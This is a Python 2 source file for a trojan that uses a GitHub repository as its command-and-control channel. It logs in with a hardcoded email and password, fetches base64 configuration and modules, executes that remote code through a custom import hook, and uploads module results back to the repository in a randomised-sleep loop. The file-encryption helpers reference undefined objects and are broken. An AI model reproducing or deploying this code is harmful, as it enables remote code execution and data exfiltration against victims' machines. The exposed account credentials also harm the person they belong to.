import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import zlib
import os
from github3 import login

key = "LpJkkp01kZPmzoXGltMS5Htb6crspLu/pI7c5EYFzLQ=".decode("base64")
extcrypt = ".crypt"

trojan_id = "natpi"
trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_modules = []

task_queue = Queue.Queue()
configured = False


class GitImporter(object):

    def __init__(self):
        self.current_module_code = ""
        
    
    def find_module(self,fullname,path=None):
        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            new_library = get_file_contents("modules/%s" % fullname)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None


    def load_module(self,name):
        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module
        return module


def fencrypt(key, f_plaintext, f_ciphertext, del_input = True):
    with open(f_plaintext, 'rb') as f_in, open(f_ciphertext, 'wb') as f_out:
        plaintext = f_in.read()
        print "Plaintext:", plaintext
        print "Compressing: %d bytes" % len(plaintext)
        plaintext = zlib.compress(plaintext)
        print "Encrypting: %d bytes" % len(plaintext)
        ciphertext = box.encrypt(plaintext, nonce).encode("base64")
        print "Base64 encoded crypto: %d bytes" % len(ciphertext)
        f_out.write(ciphertext)

    if del_input:
        os.remove(f_plaintext)


# VER : http://stackoverflow.com/questions/33178265/write-binary-data-from-a-string-to-a-binary-file

def fdecrypt(key, f_ciphertext, f_plaintext, del_input = True):
    with open(f_ciphertext, 'rb') as f_in, open(f_plaintext, 'wb') as f_out:
        ciphertext = f_in.read().decode("base64")
        print "Decrypting: %d bytes" % len(ciphertext)
        plaintext = box.decrypt(ciphertext)
        print "Uncompressing: %d bytes" % len(plaintext)
        plaintext = zlib.decompress(plaintext)
        print "Plaintext:", plaintext
        f_out.write(plaintext)

    if del_input:
        os.remove(f_ciphertext)


def connect_to_github():
    gh = login(username="nataliameziat@gmail.com",password="Odlanor@2016")
    repo = gh.repository("nataliameziat@gmail.com","natpy")
    branch = repo.branch("master")
    return gh,repo,branch


def get_file_contents(filepath):
    gh,repo,branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            # DECRYPT FILE
            print "[*] Found file %s" % filepath
            blob = repo.blob(filename._json_data['sha'])
            return blob.content

    return None


def get_trojan_config():
    global configured
    
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True
    
    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])
            
    return config


def store_module_result(data):
    # ENCRYPT ALL
    gh,repo,branch = connect_to_github()
    remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
    repo.create_file(remote_path,"Commit message",base64.b64encode(data))
    return

def module_runner(module):

    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()
    
    # store the result in our repo
    store_module_result(result)
    
    return


# main trojan loop    
sys.meta_path = [GitImporter()]

while True:

    if task_queue.empty():
        config = get_trojan_config()
        
        for task in config:
            t = threading.Thread(target=module_runner,args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10))
            
    time.sleep(random.randint(1000,10000))